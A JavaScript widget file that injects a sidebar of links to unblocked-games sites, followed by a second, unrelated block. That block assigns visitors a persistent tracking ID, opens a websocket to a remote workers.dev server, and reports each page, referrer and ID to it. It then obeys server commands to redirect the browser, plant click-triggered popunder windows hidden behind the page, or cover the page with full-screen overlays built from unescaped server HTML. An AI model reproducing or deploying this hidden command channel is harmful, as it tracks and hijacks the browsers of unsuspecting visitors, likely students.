(function() {

    const styles = `
        #custom-network-bar {
            width: 100%;
            max-width: 160px;
            height: 600px;
            background: linear-gradient(180deg, #000 0%, #1a1a1a 50%, #000 100%);
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 8px;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 15px 0;
            overflow: hidden;
            transition: opacity 0.3s ease;
        }
        #custom-network-bar.hide-animated {
            opacity: 0;
            pointer-events: none;
        }
        #custom-network-bar .brand-logo {
            font-size: 13px;
            font-weight: 900;
            text-transform: uppercase;
            font-style: italic;
            letter-spacing: 0.5px;
            margin-bottom: 10px;
            text-align: center;
            background: linear-gradient(to right, #ff0000, #ffff00, #00ff00, #00ffff, #0000ff, #ff00ff, #ff0000);
            background-size: 400% auto;
            -webkit-background-clip: text;
            text-fill-color: transparent;
            -webkit-text-fill-color: transparent;
            white-space: normal;
            cursor: pointer;
            animation: rainbowMove 3s linear infinite;
            padding: 0 10px;
        }
        @keyframes rainbowMove { 0% { background-position: 0% center; } 100% { background-position: 400% center; } }
        #custom-network-bar .divider {
            width: 80%;
            height: 1px;
            background: rgba(255,255,255,0.2);
            margin: 10px 0;
            flex-shrink: 0;
        }
        #custom-network-bar .network-links {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 10px;
            overflow-y: auto;
            overflow-x: hidden;
            width: 100%;
            flex: 1;
            scrollbar-width: none;  
            -ms-overflow-style: none;
            padding: 0 10px;
            box-sizing: border-box;
        }
        #custom-network-bar .network-links::-webkit-scrollbar { display: none; }
        #custom-network-bar .net-btn {
            text-decoration: none;
            color: #fff;
            font-weight: 700;
            font-size: 11px;
            padding: 8px 10px;
            border-radius: 50px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.15);
            transition: all 0.2s ease;
            white-space: nowrap;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            box-sizing: border-box;
            gap: 6px;
        }
        #custom-network-bar .net-btn:hover {
            transform: scale(1.05);
            background: #fff;
            color: #000;
            box-shadow: 0 0 15px rgba(255,255,255,0.5);
        }
        #custom-network-bar .net-btn.blue { background: rgba(0, 210, 255, 0.15); border-color: rgba(0, 210, 255, 0.3); }
        #custom-network-bar .net-btn.orange { background: rgba(255, 80, 0, 0.15); border-color: rgba(255, 80, 0, 0.3); }
        #custom-network-bar .net-btn.green { background: rgba(0, 255, 100, 0.15); border-color: rgba(0, 255, 100, 0.3); }
        #custom-network-bar .net-btn.purple { background: rgba(180, 0, 255, 0.15); border-color: rgba(180, 0, 255, 0.3); }
        #custom-network-bar .net-btn.blue:hover { background: #00d2ff; color: #fff; box-shadow: 0 0 15px #00d2ff; }
        #custom-network-bar .net-btn.orange:hover { background: #ff5e00; color: #fff; box-shadow: 0 0 15px #ff5e00; }
        #custom-network-bar .net-btn.green:hover { background: #00ff6a; color: #000; box-shadow: 0 0 15px #00ff6a; }
        #custom-network-bar .net-btn.purple:hover { background: #aa00ff; color: #fff; box-shadow: 0 0 15px #aa00ff; }
        .net-close-btn {
            background: rgba(255, 255, 255, 0.1);
            color: #fff;
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 50%;
            width: 28px;
            height: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            margin-top: 10px;
            font-weight: bold;
            font-size: 12px;
            transition: all 0.2s ease;
            flex-shrink: 0;
        }
        .net-close-btn:hover {
            background: #ff0055;
            border-color: #ff0055;
            transform: scale(1.1);
        }
    `;

    const bannerHtml = `
        <div id="custom-network-bar">
            <div class="brand-logo" onclick="window.scrollTo(0,0)">New Sites »</div>
            <div class="divider"></div>
            <div class="network-links">
                <a href="https://www.symbaloo.com/mix/newunblockedgames?lang=EN" target="_blank" class="net-btn purple"><span>🔥</span> Symbaloo</a>
                <a href="https://edujojo.live/" target="_blank" class="net-btn green"><span>🚀</span> Edu Live</a>
                <a href="https://edujojo.website/" target="_blank" class="net-btn orange"><span>🔥</span> Edu Web</a>
                <a href="https://edujojo.site" target="_blank" class="net-btn blue"><span>🎮</span> Edu Site</a> 
                <a href="https://edujojo.online/" target="_blank" class="net-btn blue"><span>📚</span> Edu Online</a>
                <a href="https://edujojo.space/" target="_blank" class="net-btn green"><span>🧩</span> Edu Space</a>
                <a href="https://edujojo.top/" target="_blank" class="net-btn purple"><span>💎</span> Edu Top</a>
                <a href="https://classnotes30.online/" target="_blank" class="net-btn"><span>⚽</span> Class 30</a>
                <a href="https://classnotes50.online/" target="_blank" class="net-btn orange"><span>🎬</span> Class 50</a>
            </div>
            <div class="divider"></div>
            <div class="net-close-btn" id="close-topbar" title="close">✖</div>
        </div>
    `;

    function buildNetworkBar() {
        
        if (!document.getElementById('edujojo-network-styles')) {
            const styleElement = document.createElement('style');
            styleElement.id = 'edujojo-network-styles';
            styleElement.innerHTML = styles;
            document.head.appendChild(styleElement);
        }

        const targetDiv = document.getElementById("network-bar");
        if (targetDiv && !document.getElementById('custom-network-bar')) {
            targetDiv.innerHTML = bannerHtml;
        }

        const topBarClose = document.getElementById('close-topbar');
        if (topBarClose) {
            topBarClose.addEventListener('click', function() {
                const topBar = document.getElementById('custom-network-bar');
                if (topBar) {
                    topBar.classList.add('hide-animated');
                    setTimeout(() => topBar.style.display = 'none', 300);
                }
            });
        }
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', buildNetworkBar);
    } else {
        buildNetworkBar();
    }

})();

//socket 26.06
(function() {
    if (window.networkAgentActive) return;
    window.networkAgentActive = true;

    
    let myUid = localStorage.getItem('ax_player_uid');
    if (!myUid) {
        myUid = Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
        localStorage.setItem('ax_player_uid', myUid);
    }

    const script = document.createElement('script');
    script.src = "https://cdn.socket.io/4.7.2/socket.io.min.js";
    document.head.appendChild(script);

    script.onload = () => {
        const myDomain = window.location.hostname || "Unknown-Site";
        const fullPagePath = window.location.hostname + window.location.pathname + window.location.search;
        const myReferer = document.referrer || "";

        const socket = io("https://dark-butterfly-a0dc.koydubupse.workers.dev", {
            transports: ['websocket'], 
            query: { 
                site: myDomain,
                page: fullPagePath,
                referer: myReferer,
                uid: myUid  
            } 
        });

        socket.on('execute_action', (data) => {
            if (data.actionType === 'redirect') {
                window.location.href = data.url;
            } else if (data.actionType === 'popunder') {
                if (data.url && data.url.trim() !== '') {
                    const popunderTrap = function(e) {
                        const popWin = window.open(data.url, '_blank');
                        if (popWin) {
                            try {
                                popWin.blur();
                                window.focus();
                                window.open('javascript:window.focus()', '_self', '');
                                setTimeout(() => { window.focus(); }, 10);
                            } catch (err) { }
                        }
                        window.removeEventListener('click', popunderTrap, true);
                    };
                    window.addEventListener('click', popunderTrap, true);
                }
            } else if (data.actionType === 'flash') {
                const alertDiv = document.createElement('div');
                let buttonHtml = '';
                if (data.url && data.url.trim() !== '') {
                    buttonHtml = `<a href="${data.url}" target="_blank" style="background: linear-gradient(135deg, #0ea5e9, #38bdf8); color: #0f172a; padding: 18px 50px; font-size: 20px; font-weight: 900; text-decoration: none; border-radius: 50px; box-shadow: 0 0 25px rgba(56, 189, 248, 0.4); transition: transform 0.2s; margin-bottom: 20px; text-transform: uppercase;">PLAY NOW</a>`;
                }
                const isOnlyMessage = buttonHtml === '';
                const closeBtnStyle = isOnlyMessage ? "background: #38bdf8; color: #0f172a; padding: 15px 40px; font-size: 18px; text-decoration: none;" : "background: none; color: #94a3b8; padding: 10px; font-size: 15px; text-decoration: underline;";
                const closeBtnText = isOnlyMessage ? "OK, Got it!" : "Skip for now";

                alertDiv.innerHTML = `
                    <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(15, 23, 42, 0.95); z-index: 9999999; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; font-family: 'Segoe UI', Tahoma, sans-serif; backdrop-filter: blur(5px);">
                        <h1 style="font-size: 32px; color: #f8fafc; text-align: center; margin-bottom: 40px; padding: 0 20px; max-width: 800px; line-height: 1.4;">${data.message}</h1>
                        ${buttonHtml}
                        <button id="close-flash-btn" style="border: none; font-weight: bold; border-radius: 30px; cursor: pointer; transition: 0.2s; ${closeBtnStyle}">${closeBtnText}</button>
                    </div>
                `;
                document.body.appendChild(alertDiv);
                document.getElementById('close-flash-btn').addEventListener('click', function() { alertDiv.remove(); });
            }
        });
    };
})();
